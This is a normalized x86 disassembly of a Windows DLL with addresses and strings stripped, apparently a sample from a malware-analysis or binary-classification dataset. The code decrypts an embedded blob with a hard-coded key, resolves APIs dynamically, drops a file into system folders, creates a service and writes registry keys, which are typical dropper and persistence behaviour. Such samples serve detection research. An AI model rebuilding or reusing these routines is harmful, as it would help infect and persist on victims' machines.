sub_10001000
push ebp
mov ebp esp
sub esp 0x18
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx edx
mov eax edx
mov [ ebp - 0x18 ] ecx
push ebx
shr eax 0x3
shr ecx 0x3
push esi
mov esi [ ebp + 0x14 ]
cmp eax ecx
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ecx
jae r-xdata
mov ecx eax
and edx 0x7
sub ecx [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
not ecx
and ecx edx
mov edx [ ebp - 0x18 ]
and edx 0x7
cmp ecx edx
mov [ ebp + 0x10 ] edx
jae r-xdata
mov [ ebp + 0x14 ] edx
and [ ebp + 0x14 ] 0x7
pop edi
pop esi
pop ebx
leave
retn 0x10
mov [ ebp + 0xf ] al
mov edx eax
shl [ ebp + 0xf ] 0x3
mov eax [ ebp + 0x8 ]
lea edi [ ecx + 0x2 ]
shl edx 0x3
mov [ ebp - 0x4 ] edx
lea eax [ edx + eax - 0x2 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc eax
cmp eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jb r-xdata
mov [ ebp + 0xf ] al
mov edx eax
shl [ ebp + 0xf ] 0x3
mov eax [ ebp + 0x8 ]
lea edi [ ecx + 0x2 ]
shl edx 0x3
mov [ ebp - 0x4 ] edx
lea eax [ eax + edx - 0x2 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov bl [ ebp + 0xf ]
lea eax [ edi + 0x1 ]
and eax 0x7
add bl cl
mov al [ eax + esi ]
imul bl
mov bl al
mov eax edi
and eax 0x7
or bl [ eax + esi ]
movzx eax [ edi + esi - 0x2 ]
add eax edx
add eax ecx
shr eax cl
xor bl al
lea eax [ edi - 0x1 ]
and eax 0x7
xor bl [ eax + esi ]
mov eax [ ebp - 0x8 ]
xor [ edi + eax ] bl
inc ecx
inc edi
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov ecx eax
sub ecx [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
not ecx
and ecx [ ebp + 0x14 ]
cmp ecx 0x8
jae r-xdata
mov bl [ ebp + 0xf ]
lea eax [ edi + 0x1 ]
and eax 0x7
add bl cl
mov al [ eax + esi ]
imul bl
mov bl al
mov eax edi
and eax 0x7
or bl [ eax + esi ]
movzx eax [ esi + edi - 0x2 ]
add eax edx
add eax ecx
shr eax cl
xor bl al
lea eax [ edi - 0x1 ]
and eax 0x7
xor bl [ eax + esi ]
mov eax [ ebp - 0x8 ]
xor [ eax + edi ] bl
inc ecx
inc edi
cmp edi 0xa
jl r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp + 0x10 ]
sub_10001139
push ebp
mov ebp esp
sub esp 0x20c
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call [ rw-data ]
add esp 0xc
push rw-data
call [ LoadLibraryA@IAT ]
mov edi rw-data
mov [ rw-data ] eax
push edi
mov ebx 0x104
push rw-data
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ rw-data ]
mov esi [ GetProcAddress@IAT ]
add esp 0x10
push rw-data
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
cmp [ rw-data ] 0x6
mov [ rw-data ] eax
jae r-xdata
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call [ rw-data ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20c ]
push rw-data
push ebx
push eax
call [ rw-data ]
add esp 0x1c
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000001
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_100018ac
test eax eax
je r-xdata
xor eax eax
test esi esi
sete al
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
lea eax [ eax + eax + 0x2 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push 0x1
push esi
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ rw-data ]
push [ ebp - 0x4 ]
mov esi eax
call [ rw-data ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push 0x80000002
call [ rw-data ]
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0x8 ]
push 0x1
push eax
push eax
push [ ebp - 0x4 ]
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x4 ]
call [ rw-data ]
test esi esi
je r-xdata
mov esi rw-data
push esi
call [ rw-data ]
lea eax [ eax + eax + 0x2 ]
push eax
push esi
push 0x1
push 0x0
push rw-data
push [ ebp - 0x4 ]
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000002
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ rw-data ]
lea eax [ eax + eax + 0x2 ]
push eax
push edi
push 0x1
push esi
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ rw-data ]
mov esi eax
sub_10001347
push ebp
mov ebp esp
sub esp 0x218
push ebx
push esi
push edi
xor edi edi
push 0x208
lea eax [ ebp - 0x218 ]
push edi
push eax
call [ rw-data ]
add esp 0xc
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x218 ]
push 0x104
push eax
push rw-data
push [ rw-data ]
call esi
call eax
lea eax [ ebp - 0x218 ]
push rw-data
push eax
call [ rw-data ]
push edi
push 0x80
push 0x3
push edi
push 0x1
lea eax [ ebp - 0x218 ]
push 0x80000000
push eax
call [ rw-data ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push edi
push edi
push [ ebp + 0x8 ]
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
push ebx
call [ rw-data ]
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push [ rw-data ]
call esi
call eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push [ rw-data ]
call esi
call eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10001410
push esi
mov esi [ LoadLibraryA@IAT ]
push rw-data
call esi
push rw-data
mov [ rw-data ] eax
call esi
mov esi [ GetProcAddress@IAT ]
push rw-data
push [ rw-data ]
mov [ rw-data ] eax
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
pop esi
retn
sub_10001491
push ebp
mov ebp esp
sub esp 0x210
push ebx
push esi
push edi
xor edi edi
push 0x208
lea eax [ ebp - 0x210 ]
push edi
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ rw-data ]
mov ebx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x210 ]
push ebx
push eax
call [ rw-data ]
push rw-data
push ebx
call [ rw-data ]
mov esi [ GetProcAddress@IAT ]
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
cmp eax 0xffffffff
je r-xdata
push rw-data
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
pop ecx
cmp eax edi
pop ecx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call [ rw-data ]
lea eax [ ebp - 0x210 ]
push 0x1
push eax
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
push eax
push rw-data
push [ rw-data ]
call esi
call eax
pop ecx
push eax
push rw-data
push [ rw-data ]
call esi
call eax
mov edi eax
pop ecx
cmp edi 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call esi
call eax
pop ecx
lea eax [ ebp - 0x8 ]
push 0x0
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push rw-data
push [ rw-data ]
call esi
call eax
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x14 ]
push edi
push rw-data
push [ rw-data ]
call esi
call eax
push edi
call [ rw-data ]
push rw-data
push ebx
call sub_10001139
mov [ ebp - 0x4 ] eax
sub_100015cf
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
xor esi esi
mov ecx 0x81
xor eax eax
lea edi [ ebp - 0x212 ]
mov [ ebp - 0x214 ] si
[ edi ]
stosw [ edi ]
push 0x208
lea eax [ ebp - 0x214 ]
push esi
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
call sub_10001347
push rw-data
call [ LoadLibraryA@IAT ]
lea ecx [ ebp - 0x214 ]
mov edi [ GetProcAddress@IAT ]
push ecx
push esi
push esi
push 0x8026
mov ebx rw-data
push esi
push ebx
push eax
mov [ ebp - 0x4 ] eax
call edi
call eax
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call [ rw-data ]
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call [ rw-data ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x214 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_10001491
test eax eax
je r-xdata
push 0x208
lea eax [ ebp - 0x214 ]
push esi
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x214 ]
push eax
push esi
push esi
push 0x801c
push esi
push ebx
push [ ebp - 0x4 ]
call edi
call eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x214 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_10001491
neg eax
sbb eax eax
neg eax
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
Start
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0xc ] 0xd1
mov [ ebp - 0xb ] 0xa6
mov [ ebp - 0xa ] 0xb8
mov [ ebp - 0x9 ] 0x14
mov [ ebp - 0x8 ] 0x36
mov [ ebp - 0x7 ] 0x28
mov [ ebp - 0x6 ] 0x9e
mov [ ebp - 0x5 ] 0x8a
mov [ ebp - 0x24 ] 0x54af97e1
movd mmx0 [ ebp - 0x24 ]
pslld mmx0 0x2
movd [ ebp - 0x24 ] mmx0
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x752
push rw-data
call sub_10001000
call sub_10001410
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xffff
movzx eax ax
and eax 0xff
movzx eax al
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xffff
movzx eax ax
shr eax 0x8
movzx eax al
mov [ rw-data ] eax
push rw-data
push 0x140
push [ rw-data ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x18 ] eax
push [ ebp - 0x18 ]
push [ rw-data ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x18 ]
push [ rw-data ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x1c ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x20 ] eax
push [ ebp - 0x1c ]
push 0x8
push [ ebp - 0x20 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x14 ] eax
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
call sub_10001000
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
call sub_100015cf
push [ ebp - 0x14 ]
push 0x0
push [ ebp - 0x20 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn
sub_100018ac
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x62c
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x224 ] edi
push 0x208
push edi
lea eax [ ebp - 0x220 ]
push eax
call [ rw-data ]
add esp 0xc
mov [ ebp - 0x230 ] edi
mov [ ebp - 0x22c ] edi
mov [ ebp - 0x4 ] edi
push 0x104
lea eax [ ebp - 0x220 ]
push eax
push rw-data
push [ rw-data ]
mov ebx [ GetProcAddress@IAT ]
call ebx
call eax
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x220 ]
push eax
call [ rw-data ]
push 0x2
push edi
push edi
push rw-data
push [ rw-data ]
call ebx
call eax
mov [ ebp - 0x228 ] eax
cmp eax edi
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
push edi
push edi
push edi
push edi
push edi
lea ecx [ ebp - 0x220 ]
push ecx
push 0x1
push 0x2
push 0x110
push 0xf01ff
mov esi rw-data
push esi
push esi
push eax
push rw-data
push [ rw-data ]
call ebx
call eax
mov [ ebp - 0x224 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x638 ] rw-data
lea ecx [ ebp - 0x638 ]
push ecx
push 0x1
push eax
push rw-data
push [ rw-data ]
call ebx
call eax
lea eax [ ebp - 0x230 ]
push eax
push rw-data
push 0x80000002
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
mov [ ebp - 0x234 ] 0x1
push 0x4
lea eax [ ebp - 0x234 ]
push eax
push 0x4
push edi
push rw-data
push [ ebp - 0x230 ]
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x230 ]
call [ rw-data ]
mov [ ebp - 0x230 ] edi
lea eax [ ebp - 0x230 ]
push eax
push rw-data
push 0x80000002
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
lea eax [ ebp - 0x22c ]
push eax
push rw-data
push [ ebp - 0x230 ]
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x230 ]
call [ rw-data ]
mov [ ebp - 0x230 ] edi
push [ ebp + 0x8 ]
call [ rw-data ]
lea eax [ eax + eax + 0x2 ]
push eax
push [ ebp + 0x8 ]
push 0x2
push edi
push rw-data
push [ ebp - 0x22c ]
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
mov [ ebp - 0x234 ] 0x1
push 0x4
lea eax [ ebp - 0x234 ]
push eax
push 0x4
push edi
push rw-data
push [ ebp - 0x22c ]
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x22c ]
call [ rw-data ]
mov [ ebp - 0x22c ] edi
lea eax [ ebp - 0x230 ]
push eax
push rw-data
push 0x80000002
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
jne r-xdata
push 0x400
push edi
lea eax [ ebp - 0x634 ]
push eax
call [ rw-data ]
add esp 0xc
push esi
call [ rw-data ]
shl eax 0x1
mov [ ebp - 0x63c ] eax
push eax
push esi
lea eax [ ebp - 0x634 ]
push eax
push rw-data
push [ rw-data ]
call ebx
call eax
add esp 0xc
add [ ebp - 0x63c ] 0x4
push [ ebp - 0x63c ]
lea eax [ ebp - 0x634 ]
push eax
push 0x7
push edi
push rw-data
push [ ebp - 0x230 ]
call [ rw-data ]
mov [ ebp - 0x234 ] eax
cmp eax edi
je r-xdata
push [ ebp - 0x230 ]
call [ rw-data ]
mov [ ebp - 0x230 ] edi
push 0x1
pop edi
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
mov eax edi
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10001be0
xor edi edi
cmp [ ebp - 0x22c ] edi
je r-xdata
cmp [ ebp - 0x230 ] edi
je r-xdata
push [ ebp - 0x22c ]
call [ rw-data ]
cmp [ ebp - 0x224 ] edi
je r-xdata
push [ ebp - 0x230 ]
call [ rw-data ]
cmp [ ebp - 0x228 ] edi
je r-xdata
push [ ebp - 0x224 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
retn
push [ ebp - 0x228 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
sub_10001c5c
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10001c5c
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001896
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10001c5c
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10001c5c
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10001896
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
push 0x1
pop eax
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
_except_handler3
jmp [ _except_handler3@IAT ]
_local_unwind2
jmp [ _local_unwind2@IAT ]
_initterm
jmp [ _initterm@IAT ]
